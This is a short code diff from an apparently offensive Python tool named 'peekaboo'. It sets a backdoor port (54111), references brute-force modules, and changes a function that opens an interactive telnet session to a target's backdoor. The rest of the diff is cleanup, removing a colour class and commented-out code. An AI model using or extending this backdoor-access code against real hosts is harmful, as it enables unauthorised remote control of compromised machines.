@@ -21,18 +21,6 @@ SESSION = None
 BACKDOOR_PORT = 54111
 
 WORKING = os.path.abspath('.')
-
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
 # peekaboo modules
 #
 # e.g bruteforce.py
@@ -229,16 +217,8 @@ def session_target():
         print('[session target] Target has no backdoor...')
     else:
         with telnetlib.Telnet(TARGET.ip_addr, BACKDOOR_PORT) as tn:
-#            while 1:
-#                try:
-                tn.interact()
-                tn.close()
-                    #print(tn.read_all().decode('ascii'))
-                    #cmd = input('cmd:')
-                    #tn.write(cmd.encode('ascii') + b'\n')
-#                except KeyboardInterrupt:
-#                    break
-
+            tn.interact()
+            tn.close()
         
 def info_target(hosts, args):
     
